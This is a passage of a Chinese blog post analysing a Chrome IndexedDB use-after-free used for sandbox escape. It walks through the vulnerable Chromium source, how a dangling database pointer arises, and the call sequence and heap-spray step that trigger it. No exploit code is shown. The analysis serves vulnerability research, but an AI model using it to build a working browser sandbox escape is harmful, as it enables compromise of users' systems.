<p>这里没有设置<code>--headless</code>，是因为chrome<strong>单次刷新页面的速度比gdb重启chrome的速度快上很多</strong>，这样每次修改完<code>exploit/poc</code>后只需点击刷新即可。</p>
</blockquote>
<p>输入以下命令即可开启调试</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gdb -x gdbinit</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>如果执行时提示<code>No usable sandbox!</code>，执行以下命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo sysctl -w kernel.unprivileged_userns_clone=1</span><br></pre></td></tr></table></figure>
<p><strong>机器重启后该命令将会失效</strong>，届时需要重新执行。</p>
</li>
</ul>
<h2 id="二、IndexedDB简介">二、IndexedDB简介</h2>
<ul>
<li>
<p>Chrome中IndexedDB的大部分是在浏览器进程中实现。 浏览器和渲染中都存在几个不同的mojo IPC接口，用于进程之间的通信，并且使得沙盒渲染能够执行IndexedDB的操作。</p>
</li>
<li>
<p>IndexedDBFactory <a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/public/mojom/indexeddb/indexeddb.mojom" target="_blank" rel="noopener">mojo接口</a>是渲染的主要入口点。 <strong>大多数操作（打开、关闭数据库等）都是通过IndexedDBFactory实例来进一步操作IndexedDatabase实例</strong>（注意这句话）。</p>
</li>
<li>
<p>IndexedDB有关于数据库和连接的概念。 对于Chrome-IndexedDB，分别由<code>IndexedDBDatabase</code>和<code>IndexedDBConnection</code>类表示。 在某一时间段内可以<strong>存在对同一数据库的多个连接</strong>，但是每个数据库<strong>只有一个IndexedDBDatabase对象</strong>。</p>
</li>
<li>
<p>另一个要理解的重要概念是<strong>请求。 打开和删除数据库操作不可能同时发生</strong>，但会规划执行相应操作的请求。 通过<code>IndexedDBDatabase::OpenRequest</code> 和<code>IndexedDBDatabase::DeleteRequest</code>类可以实现这些功能。</p>
<blockquote>
<p><code>OpenRequest</code>类和<code>DeleteRequest</code>类是声明在<code>IndexedDBDatabase</code>类中的，换句话说这两个类都是<code>IndexedDBDatabase</code>类的子类。</p>
</blockquote>
</li>
<li>
<p>IndexedDBDatabase对象是一种<strong>引用计数（Reference counted）的对象</strong>。 针对该对象的计数引用被保存在IndexedDBConnection对象、IndexedDBTransaction对象或其他正在进行或待处理的请求对象中。 一旦引用计数降至0，会立即释放对象。</p>
</li>
<li>
<p>释放数据库对象后，<strong>会从数据库映射中删除指向IndexedDBDatabase的相应原始指针</strong>，这点非常重要。</p>
</li>
<li>
<p>我们顺便简单了解一下IndexDB的<code>JS API</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">dbName = <span class="string">"mycurrent"</span>;</span><br><span class="line"><span class="comment">// 打开一个数据库，其中数据库名称为dbName，2为数据库版本</span></span><br><span class="line"><span class="comment">// 返回一个requests，这个request在这里应该是OpenRequest</span></span><br><span class="line"><span class="keyword">var</span> request = indexedDB.open(dbName, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// onsuccess是该request处理完成后所执行的回调函数</span></span><br><span class="line">request.onsuccess = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 当该request执行成功后，request中的result成员为所打开的数据库对象</span></span><br><span class="line">  db = request.result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 关闭一个数据库</span></span><br><span class="line"><span class="keyword">var</span> deleteRequest = indexedDB.deleteDatabase(dbName);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>具体IndexedDB 的细节我们将在下节详细讲解。</p>
</blockquote>
<h2 id="三、漏洞分析">三、漏洞分析</h2>
<h3 id="1-connections-成员变量">1. connections_成员变量</h3>
<p>在讲解漏洞代码之前，我们先了解一下<code>IndexedDBDatabase::connections_</code>成员变量。<code>connections_</code>集合存储着<strong>当前连接至<code>IndexedDatabase</code>的所有连接</strong>。当有新connection连接至数据库，或某个connection被中断时，该<code>connections_</code>变量都会被修改（执行insert或remove函数）。而该关键变量是一个<code>list_set</code>类型的成员。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CONTENT_EXPORT</span> <span class="title">IndexedDBDatabase</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">      list_set&lt;IndexedDBConnection*&gt; connections_;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p><code>list_set</code>类型是<code>list</code>与<code>set</code>的结合体，这里我们只需关注该结构体的<code>end</code>函数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">iterator <span class="title">end</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> iterator(list_.end()); &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，<code>list_set::end</code>函数返回的是<strong>list的迭代器</strong>。</p>
<h3 id="2-database-map-成员变量">2. database_map_成员变量</h3>
<p>该成员变量保存了所有指向打开的<code>IndexedDatabase</code>的<strong>原始指针</strong></p>
<blockquote>
<p>注意，直接使用C++的原始指针通常是一个比较危险的事情。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CONTENT_EXPORT</span> <span class="title">IndexedDBFactoryImpl</span> :</span> <span class="keyword">public</span> IndexedDBFactory &#123;</span><br><span class="line"> <span class="comment">// ...</span></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">map</span>&lt;IndexedDBDatabase::Identifier, IndexedDBDatabase*&gt; database_map_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当打开一个新的数据库时，指向该数据库的原始指针将会被添加进<code>database_map_</code>中；同样当关闭一个数据库时，指向该数据库的原始指针将会从<code>database_map_</code>中被移除。</p>
<h3 id="3-漏洞流程">3. 漏洞流程</h3>
<h4 id="a-“悬垂”指针">a. “悬垂”指针</h4>
<p>我们先来简单了解一下删除数据库的流程。</p>
<ul>
<li>
<p>当JS中执行<code>indexedDB.deleteDatabase</code>函数时，通过render与chrome之间的IPC通信，chrome进程会执行<a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_factory_impl.cc;l=492;bpv=0;bpt=1" target="_blank" rel="noopener">IndexedDBFactoryImpl::DeleteDatabase</a>函数，在该函数中，程序会进一步调用对应<code>IndexedDBDatabase</code>的<code>DeleteDatabase</code>函数来处理对应的数据库。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IndexedDBFactoryImpl::DeleteDatabase</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> base::string16&amp; name,</span></span></span><br><span class="line"><span class="function"><span class="params">        scoped_refptr&lt;IndexedDBCallbacks&gt; callbacks,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> Origin&amp; origin,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> base::FilePath&amp; data_directory,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">bool</span> force_close)</span> </span>&#123;</span><br><span class="line">  IDB_TRACE(<span class="string">"IndexedDBFactoryImpl::DeleteDatabase"</span>);</span><br><span class="line">  <span class="comment">// 每个IndexedDatabase在IndexedDBFactoryImpl类中都有对应唯一的idntifier</span></span><br><span class="line">  <span class="comment">// 该函数通过数据库名称来获取identifier并进一步在database_map中查找对应的IndexedDatabase指针</span></span><br><span class="line">  <span class="function">IndexedDBDatabase::Identifier <span class="title">unique_identifier</span><span class="params">(origin, name)</span></span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">auto</span>&amp; it = database_map_.find(unique_identifier);</span><br><span class="line">  <span class="keyword">if</span> (it != database_map_.end()) &#123;</span><br><span class="line">    <span class="comment">// 如果找到了对应的数据库，则执行该数据库的DeleteDatabase函数</span></span><br><span class="line">    it-&gt;second-&gt;DeleteDatabase(callbacks, force_close);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在<a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_database.cc;l=1862" target="_blank" rel="noopener">IndexedDBDatabase::DeleteDatabase</a>中，程序会添加一个<code>DeleteRequest</code>到当前<code>IndexedDatabase</code>中的待处理请求列表中，当数据库处理到<code>DeleteRequest</code>时，数据库就会马上关闭。这样做的目的是为了<strong>在剩余的请求（<code>DeleteRequest</code>前的所有请求）全部处理完之后，再关闭当前数据库</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IndexedDBDatabase::DeleteDatabase</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    scoped_refptr&lt;IndexedDBCallbacks&gt; callbacks,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">bool</span> force_close)</span> </span>&#123;</span><br><span class="line">  AppendRequest(<span class="built_in">std</span>::make_unique&lt;DeleteRequest&gt;(<span class="keyword">this</span>, callbacks));</span><br><span class="line">  <span class="comment">// Close the connections only after the request is queued to make sure</span></span><br><span class="line">  <span class="comment">// the store is still open.</span></span><br><span class="line">  <span class="keyword">if</span> (force_close)</span><br><span class="line">    ForceClose();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>但是倘若<strong>设置了<code>force_close</code>标志</strong>后，则程序将会进一步执行<code>ForceClose</code>函数来强制关闭所有的<code>request</code>和<code>connection</code>。但是，第二段<strong>用于遍历关闭连接的代码</strong>在修改<code>connections_</code>时<strong>并不安全</strong>。<strong>（漏洞点!）</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IndexedDBDatabase::ForceClose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// IndexedDBConnection::ForceClose() may delete this database, so hold ref.</span></span><br><span class="line">  <span class="function">scoped_refptr&lt;IndexedDBDatabase&gt; <span class="title">protect</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">  <span class="comment">// 循环将所有尚未处理的请求强制关闭</span></span><br><span class="line">  <span class="keyword">while</span> (!pending_requests_.empty()) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;ConnectionRequest&gt; request =</span><br><span class="line">        <span class="built_in">std</span>::move(pending_requests_.front());</span><br><span class="line">    pending_requests_.pop();</span><br><span class="line">    request-&gt;AbortForForceClose();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 循环将所有连接到当前数据库的connections强制断开</span></span><br><span class="line">  <span class="comment">// 注意！这段代码在修改connection_时不够安全</span></span><br><span class="line">  <span class="keyword">auto</span> it = connections_.begin();</span><br><span class="line">  <span class="keyword">while</span> (it != connections_.end()) &#123;</span><br><span class="line">    IndexedDBConnection* connection = *it++;</span><br><span class="line">    <span class="comment">// 注意这一步，执行`connection-&gt;ForceClose()`时，程序会关闭当前连接。</span></span><br><span class="line">    <span class="comment">// 但倘若当前遍历的连接是connection_中的最后一条连接，则会执行函数StartUpgrade以建立新连接</span></span><br><span class="line">    connection-&gt;ForceClose();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 常规检查</span></span><br><span class="line">  DCHECK(connections_.empty());</span><br><span class="line">  DCHECK(!active_request_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在第二个用于关闭connection的循环中，程序会执行<code>connection-&gt;ForceClose()</code>，即<a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_connection.cc;l=48;bpv=0;bpt=0" target="_blank" rel="noopener">IndexedDBConnection::ForceClose函数</a>，以强制关闭该connection。而为了在<code>IndexedDBDatabase</code>中释放当前连接在数据库中所占用的资源，在这个函数中，程序会进一步调用<code>IndexedDBDatabase::Close</code>函数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IndexedDBConnection::ForceClose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!callbacks_.get())</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// IndexedDBDatabase::Close() can delete this instance.</span></span><br><span class="line">  base::WeakPtr&lt;IndexedDBConnection&gt; this_obj = weak_factory_.GetWeakPtr();</span><br><span class="line">  <span class="function">scoped_refptr&lt;IndexedDBDatabaseCallbacks&gt; <span class="title">callbacks</span><span class="params">(callbacks_)</span></span>;</span><br><span class="line">  <span class="comment">// 注意这条代码</span></span><br><span class="line">  database_-&gt;Close(<span class="keyword">this</span>, <span class="literal">true</span> <span class="comment">/* forced */</span>);</span><br><span class="line">  <span class="keyword">if</span> (this_obj) &#123;</span><br><span class="line">    database_ = <span class="literal">nullptr</span>;</span><br><span class="line">    callbacks_ = <span class="literal">nullptr</span>;</span><br><span class="line">    active_observers_.clear();</span><br><span class="line">  &#125;</span><br><span class="line">  callbacks-&gt;OnForcedClose();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_database.cc;l=1897" target="_blank" rel="noopener">IndexDBDatabase::Close函数</a>会依次执行一系列操作，但这里我们只关注两个操作。该函数中，程序会先<strong>在<code>connection_</code>集合中删除当前连接</strong>，之后<strong>执行<code>active_request_-&gt;OnConnectionClosed</code>函数</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IndexedDBDatabase::Close</span><span class="params">(IndexedDBConnection* connection, <span class="keyword">bool</span> forced)</span> </span>&#123;</span><br><span class="line">  DCHECK(connections_.count(connection));</span><br><span class="line">  DCHECK(connection-&gt;IsConnected());</span><br><span class="line">  DCHECK(connection-&gt;database() == <span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">  IDB_TRACE(<span class="string">"IndexedDBDatabase::Close"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 终止当前连接中所有的未完成事务</span></span><br><span class="line">  connection-&gt;FinishAllTransactions(IndexedDBDatabaseError(</span><br><span class="line">      blink::kWebIDBDatabaseExceptionUnknownError, <span class="string">"Connection is closing."</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 从数据库中的connections_集合中删除当前request</span></span><br><span class="line">  connections_.erase(connection);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 通知当前正在处理的请求，因为当前请求可能需要进行清理或者继续进行操作</span></span><br><span class="line">  <span class="keyword">if</span> (active_request_)</span><br><span class="line">    active_request_-&gt;OnConnectionClosed(connection);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果当前数据库中的所有连接和所有请求均已经全部释放完成，则从IndexDBFactory类实例中删除指向当前IndexedDBData的指针</span></span><br><span class="line">  <span class="keyword">if</span> (connections_.empty() &amp;&amp; !active_request_ &amp;&amp; pending_requests_.empty()) &#123;</span><br><span class="line">    backing_store_ = <span class="literal">nullptr</span>;</span><br><span class="line">    factory_-&gt;ReleaseDatabase(identifier_, forced);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>OnConnectionClosed</code>函数中会先判断当前待处理connection<strong>是否被过早关闭</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnConnectionClosed</span><span class="params">(IndexedDBConnection* connection)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如果连接过早关闭（即一个pending的connection被关闭了，此时会调用OnConnectionClosed</span></span><br><span class="line">    <span class="keyword">if</span> (connection &amp;&amp; connection-&gt;callbacks() == pending_-&gt;database_callbacks) &#123;</span><br><span class="line">        pending_-&gt;callbacks-&gt;OnError(</span><br><span class="line">            IndexedDBDatabaseError(blink::kWebIDBDatabaseExceptionAbortError,</span><br><span class="line">                                   <span class="string">"The connection was closed."</span>));</span><br><span class="line">        <span class="comment">// 该连接将在数据库中被重置</span></span><br><span class="line">        db_-&gt;RequestComplete(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果当前connection不是最后一个要处理的连接，则不会执行到StartUpgrade创建新连接。</span></span><br><span class="line">    <span class="keyword">if</span> (!db_-&gt;connections_.empty())</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    StartUpgrade();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果当前连接类型不为<code>pending connection</code>，即<strong>该连接并非被过早关闭</strong>（即正常情况，正常情况是比异常情况更容易触发的），并且<strong>当前连接为connections_中的最后一个连接</strong>。则该函数会执行<a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_database.cc;l=243" target="_blank" rel="noopener">StartUpgrade</a>函数，<code>StartUpgrade</code>函数内部会使得IndexedDBDatabase<strong>创建一个新的pending connection至connections_列表中</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Initiate the upgrade. The bulk of the work actually happens in</span></span><br><span class="line"><span class="comment">// IndexedDBDatabase::VersionChangeOperation in order to kick the</span></span><br><span class="line"><span class="comment">// transaction into the correct state.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StartUpgrade</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使数据库创建一个新的连接</span></span><br><span class="line">    connection_ = db_-&gt;CreateConnection(pending_-&gt;database_callbacks,</span><br><span class="line">                                        pending_-&gt;child_process_id);</span><br><span class="line">    DCHECK_EQ(db_-&gt;connections_.count(connection_.get()), <span class="number">1U</span>L);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int64_t</span>&gt; object_store_ids;</span><br><span class="line"></span><br><span class="line">    IndexedDBTransaction* transaction = connection_-&gt;CreateTransaction(</span><br><span class="line">        pending_-&gt;transaction_id,</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">set</span>&lt;<span class="keyword">int64_t</span>&gt;(object_store_ids.begin(), object_store_ids.end()),</span><br><span class="line">        blink::mojom::IDBTransactionMode::VersionChange,</span><br><span class="line">        <span class="keyword">new</span> IndexedDBBackingStore::Transaction(db_-&gt;backing_store()));</span><br><span class="line">    db_-&gt;RegisterAndScheduleTransaction(transaction);</span><br><span class="line"></span><br><span class="line">    transaction-&gt;ScheduleTask(</span><br><span class="line">        base::BindOnce(&amp;IndexedDBDatabase::VersionChangeOperation, db_,</span><br><span class="line">                       pending_-&gt;version, pending_-&gt;callbacks));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>这样，<code>connections_</code>集合元素将不为0。当控制流从<code>OnConnectionClosed</code>函数返回时，便无法通过下面的判断。这样，就无法执行<code>factory_-&gt;ReleaseDatabase</code>。</p>
<blockquote>
<p>预期情况是，当最后一个连接被erase后，一定进入下面的if语句以执行<code>factory_-&gt;ReleaseDatabase</code>，但在这里显然是一个非预期情况。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IndexedDBDatabase::Close</span><span class="params">(IndexedDBConnection* connection, <span class="keyword">bool</span> forced)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> (active_request_)</span><br><span class="line">    active_request_-&gt;OnConnectionClosed(connection);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果当前数据库中的所有连接和所有请求均已经全部释放完成，则从IndexDBFactory类实例中删除指向当前IndexedDBData的指针</span></span><br><span class="line">  <span class="keyword">if</span> (connections_.empty() &amp;&amp; !active_request_ &amp;&amp; pending_requests_.empty()) &#123;</span><br><span class="line">    backing_store_ = <span class="literal">nullptr</span>;</span><br><span class="line">    factory_-&gt;ReleaseDatabase(identifier_, forced);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而<code>factory_-&gt;ReleaseDatabase</code>函数会将<strong>指向当前数据库的原始指针</strong>从<code>database_map_</code>中删除，也就是说，若<code>IndexedDBFactoryImpl::ReleaseDatabase</code>不被执行，则<strong>该原始指针就一直保存在<code>database_map_</code>中</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IndexedDBFactoryImpl::ReleaseDatabase</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> IndexedDBDatabase::Identifier&amp; identifier,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">bool</span> forced_close)</span> </span>&#123;</span><br><span class="line">  DCHECK(!database_map_.find(identifier)-&gt;second-&gt;backing_store());</span><br><span class="line">  <span class="comment">// 将当前IndexedDatabase原始指针从database_map中删除</span></span><br><span class="line">  RemoveDatabaseFromMaps(identifier);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// No grace period on a forced-close, as the initiator is</span></span><br><span class="line">  <span class="comment">// assuming the backing store will be released once all</span></span><br><span class="line">  <span class="comment">// connections are closed.</span></span><br><span class="line">  ReleaseBackingStore(identifier.first, forced_close);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终，<code>database_map_</code>中保留的<strong>原始指针并没有被删除</strong>。</p>
</li>
<li>
<p>同时，当控制流返回<code>IndexedDBDatabase::ForceClose</code>函数时，由于<code>connections_</code>集合既执行了<code>erase</code>函数，又执行了<code>insert</code>函数，因此在下一次判断循环条件<code>it != connections_.end()</code>时，<code>connection_</code>集合中仍然存在connection（尽管此时的连接非彼时的连接），<strong>connection_集合的元素个数将保持不变</strong>。</p>
<p>而<code>end</code>函数返回的是<code>list</code>的迭代器，<strong>所以返回的<code>end</code>迭代器将保证不变</strong>，而<code>it++</code>，因此将跳出该循环，结束<strong>连接的终止操作</strong>。</p>
<p>但最重要的是，<code>IndexedDBFactoryImpl::database_map</code>中<strong>仍然保留指向当前数据库的原始指针</strong>。该指针本应该在当前循环执行结束时被移除，但这里却没有被移除。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IndexedDBDatabase::ForceClose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">auto</span> it = connections_.begin();</span><br><span class="line">  <span class="keyword">while</span> (it != connections_.end()) &#123;</span><br><span class="line">    IndexedDBConnection* connection = *it++;</span><br><span class="line">    <span class="comment">// 注意这一步，执行`connection-&gt;ForceClose()`时，程序会关闭当前连接。</span></span><br><span class="line">    <span class="comment">// 但倘若当前遍历的连接是connection_中的最后一条连接，则会执行函数StartUpgrade以建立新连接</span></span><br><span class="line">    connection-&gt;ForceClose();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>现在，我们可以成功将指向当前<code>IndexedDatabase</code>的一个原始指针保存至<strong>本不该保存的地方</strong>(指<code>database_map</code>)。而我们下一步要做的就是尝试将当前<code>IndexedDatabase</code>所使用的内存释放。</p>
</li>
</ul>
<h4 id="b-释放IndexedDB内存">b. 释放IndexedDB内存</h4>
<ul>
<li>
<p>IndexedDBDatabase对象是一种<strong>引用计数（Reference counted）的对象</strong>。 针对该对象的计数引用被保存在IndexedDBConnection对象、IndexedDBTransaction对象或其他正在进行或待处理的请求对象中。 一旦引用计数降至0，会立即释放对象。（以免忘记，这段又重复了一遍）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CONTENT_EXPORT</span> <span class="title">IndexedDBConnection</span> &#123;</span></span><br><span class="line"> <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// NULL in some unit tests, and after the connection is closed.</span></span><br><span class="line">  scoped_refptr&lt;IndexedDBDatabase&gt; database_;</span><br><span class="line"> <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CONTENT_EXPORT</span> <span class="title">IndexedDBTransaction</span> &#123;</span></span><br><span class="line"> <span class="comment">// ...</span></span><br><span class="line">  scoped_refptr&lt;IndexedDBDatabase&gt; database_;</span><br><span class="line"> <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>也就是说，一旦我们将所有与当前IndexedDBDatabase对象相关的Connection和Transaction对象全部释放，那么当前IndexedDBDatabase就会因为引用计数为0而自动释放。</p>
</li>
<li>
<p>Issue941746给出了一种方法 —— 通过调用<code>IndexedDBFactoryImpl::AbortTransactionsForDatabase</code>来释放IndexedDBDatabase对象。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数调用call</span></span><br><span class="line">content::IndexedDBFactoryImpl::AbortTransactionsForDatabase</span><br><span class="line">  content::IndexedDBFactoryImpl::AbortTransactions                 <span class="comment">// 循环对所有IndexedDatabase执行AbortAllTransactionsForConnections</span></span><br><span class="line">    content::IndexedDBDatabase::AbortAllTransactionsForConnections <span class="comment">// 循环对所有Connection执行FinishAllTransactions</span></span><br><span class="line">      content::IndexedDBConnection::FinishAllTransactions          <span class="comment">// 循环对所有Transactions执行Abort</span></span><br><span class="line">        content::IndexedDBTransaction::Abort</span><br><span class="line">          content::IndexedDBConnection::RemoveTransaction          <span class="comment">// 释放Transaction</span></span><br><span class="line">          content::IndexedDBDatabase::TransactionFinished          <span class="comment">// 释放Connection</span></span><br></pre></td></tr></table></figure>
<p>执行<code>AbortTransactionsForDatabase</code>函数将会释放所有的<code>IndexedDBConnection</code>以及<code>IndexedDBTransaction</code>，进而释放<code>IndexedDatabase</code>对象，如此就能达到我们想要释放某个IndexedDatabase对象的目的。</p>
<blockquote>
<p>这里贴出IndexedDBTransaction::Abort函数的关键代码。<strong>请注意函数内部的注释</strong>。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IndexedDBTransaction::Abort</span><span class="params">(<span class="keyword">const</span> IndexedDBDatabaseError&amp; error)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  database_-&gt;TransactionFinished(<span class="keyword">this</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// RemoveTransaction will delete |this|.</span></span><br><span class="line">  <span class="comment">// Note: During force-close situations, the connection can be destroyed during</span></span><br><span class="line">  <span class="comment">// the |IndexedDBDatabase::TransactionFinished| call</span></span><br><span class="line">  <span class="comment">// 上面这段注释表示，在`force_close = true`的前提下，执行该函数将会释放connection以及trasaction</span></span><br><span class="line">  <span class="keyword">if</span> (connection_)</span><br><span class="line">    connection_-&gt;RemoveTransaction(id_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="c-如何触发UAF">c. 如何触发UAF</h4>
<ul>
<li>
<p>根据上面的分析，我们可以得出，当顺序调用这三个函数时，我们便可以成功使<code>database_map</code>中保存一个指向已被释放内存的悬垂指针。</p>
<ul>
<li><code>Open(db1)</code></li>
<li><code>DeleteDatabase(db1, force_close=True)</code></li>
<li><code>AbortTransactionsForDatabase</code></li>
</ul>
</li>
<li>
<p>之后，我们只需通过Heap Spray将这块被释放的内存重新分配回来即可利用。</p>
</li>
<li>
<p>但这里有个问题，如何在render进程中通过IndexedDBFactory来调用这三个函数呢？实际上，render的JS接口可以调用IndexedDB的<code>open</code>和<code>deleteDatabase</code>，但无法调用<code>AbortTransactionsForDatabase</code>接口。同时，这里存在一个问题，<strong>我们无法保证browser进程中的函数执行顺序如我们所期待的那样</strong>，因为Js中IndexedDB接口大多都是<strong>异步</strong>的，因此browser中的这三个函数可能无法依次、完全的完成执行。</p>
</li>
<li>
<p>但我们又必须在render进程中依次同步执行这三个函数，而这就是为什么<strong>该漏洞只能在<code>render RCE</code>的基础上利用</strong>的原因了。</p>
<p>由于 <strong><code>render RCE</code>可以给render进程自己打上patch</strong>，所以就可以在render进程中打patch<strong>以保证这三个函数可以被同步调用</strong>（即依次执行）。</p>
<blockquote>
<p>这也是为什么在<strong>环境搭建</strong>时要在chrome源码中打上patch的原因，因为手动打上patch可以模拟render RCE 打patch的结果。</p>
</blockquote>
